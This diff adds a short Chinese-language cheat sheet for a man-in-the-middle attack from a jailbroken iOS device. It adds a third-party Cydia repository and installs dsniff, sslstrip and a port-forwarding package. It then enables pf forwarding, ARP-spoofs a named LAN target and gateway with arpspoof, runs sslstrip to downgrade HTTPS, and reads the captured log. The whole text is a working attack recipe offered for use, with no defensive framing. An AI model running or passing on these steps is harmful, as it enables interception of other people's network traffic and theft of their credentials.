@@ -1,0 +1,28 @@
+cydia 添加源
+www.starwarsfan2099.x10host.com/repo
+
+安裝套件
+SSLstrip、Dsniff Suite、Port Forwarding
+
+終端機安裝命令
+添加源
+# echo "deb http://www.starwarsfan2099.x10host.com/repo/ ./" >> /etc/apt/sources.list.d/cydia.list
+# apt-get update
+安裝套件
+# apt-get install dsniff sslstrip portfowarding.package
+
+端口轉發
+# pfctl -e -f /etc/pf_ssl.conf
+
+查看網關IP
+# netstat -nr
+
+ARP欺騙
+用法 -i (interface) -t (target) (gateway)
+# arpspoof -i en0 -t 192.168.254.46 192.168.254.254
+
+打開新窗口
+# sslstrip
+
+查看擷取數據
+# cat sslstrip.log
